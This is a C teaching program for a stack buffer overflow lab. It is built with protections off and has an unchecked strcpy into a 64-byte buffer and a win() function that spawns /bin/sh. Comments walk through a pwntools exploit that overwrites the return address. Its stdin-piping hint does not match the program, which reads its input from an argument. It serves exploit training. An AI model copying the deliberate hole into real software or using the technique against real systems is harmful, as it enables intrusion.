/*
 * Stack Buffer Overflow Example
 * 
 * This program demonstrates a classic stack-based buffer overflow vulnerability.
 * 
 * Compile:
 *   gcc -fno-stack-protector -z execstack -no-pie stack_overflow.c -o stack_overflow
 * 
 * Disable protections:
 *   -fno-stack-protector : Disable stack canaries
 *   -z execstack         : Make stack executable
 *   -no-pie              : Disable PIE
 * 
 * WARNING: This is vulnerable by design for educational purposes!
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// This function should be called by exploiting the buffer overflow
void win() {
    printf("\nðŸŽ‰ Congratulations! You executed the win() function!\n");
    printf("In a real exploit, this could spawn a shell...\n\n");
    system("/bin/sh");
}

// Vulnerable function with buffer overflow
void vulnerable(char *input) {
    char buffer[64];
    
    printf("Buffer is at: %p\n", buffer);
    printf("Input address: %p\n", input);
    
    // VULNERABILITY: No bounds checking!
    strcpy(buffer, input);
    
    printf("You entered: %s\n", buffer);
}

int main(int argc, char **argv) {
    printf("=== Stack Buffer Overflow Example ===\n\n");
    
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        printf("\nHints:\n");
        printf("  - The buffer is 64 bytes\n");
        printf("  - You need to overwrite the return address\n");
        printf("  - The win() function is at: %p\n", win);
        printf("\nExample exploit:\n");
        printf("  python3 -c 'from pwn import *; print(\"A\"*72 + p64(%p))' | %s\n", 
               win, argv[0]);
        return 1;
    }
    
    printf("Calling vulnerable function...\n");
    vulnerable(argv[1]);
    
    printf("Returned from vulnerable function\n");
    return 0;
}

/*
 * Exploitation Steps:
 * 
 * 1. Find the offset to the return address:
 *    - Buffer size: 64 bytes
 *    - Saved RBP: 8 bytes
 *    - Total offset: 72 bytes
 * 
 * 2. Get address of win():
 *    - Run program to see the address
 *    - Or use: objdump -d stack_overflow | grep win
 * 
 * 3. Create payload:
 *    - 72 bytes of padding
 *    - Address of win() (8 bytes, little-endian)
 * 
 * 4. Example with pwntools:
 *    from pwn import *
 *    
 *    elf = ELF('./stack_overflow')
 *    win_addr = elf.symbols['win']
 *    
 *    payload = b'A' * 72
 *    payload += p64(win_addr)
 *    
 *    p = process(['./stack_overflow', payload])
 *    p.interactive()
 * 
 * 5. Manual exploitation:
 *    python3 -c "from pwn import *; import sys; sys.stdout.buffer.write(b'A'*72 + p64(0x401196))" | ./stack_overflow
 *    
 *    Note: Replace 0x401196 with actual address of win()
 */
